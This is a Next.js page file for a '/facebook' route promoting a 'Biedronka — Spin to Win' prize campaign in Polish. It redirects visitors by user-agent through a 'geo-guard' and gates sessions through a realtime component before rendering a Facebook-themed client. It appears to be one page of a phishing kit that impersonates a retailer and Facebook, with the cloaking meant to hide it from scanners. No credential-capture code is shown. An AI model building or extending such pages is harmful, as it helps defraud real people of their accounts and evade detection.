import { headers } from "next/headers";
import { redirect } from "next/navigation";
import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { resolveServerSessionIdentity } from "@/lib/session-id";
import { buildShareMetadata } from "@/lib/share-metadata";
import { getBlockedRedirectUrl } from "@/lib/geo-guard";
import { resumeOrRedirectHome } from "@/lib/session-resume";
import { FacebookClient } from "./facebook-client";

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "Biedronka — Spin to Win",
    description:
      "Specjalna kampania Biedronka Koło Fortuny! Spróbuj szczęścia i wygraj wyjątkowe nagrody.",
    canonical: "/facebook",
  });
}

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function FacebookPage({ searchParams }: Props) {
  const h = await headers();
  const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
  if (blockedUrl) redirect(blockedUrl);

  const params = await searchParams;
  await resumeOrRedirectHome(params);

  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: params,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <FacebookClient sessionId={sessionId} />
    </>
  );
}
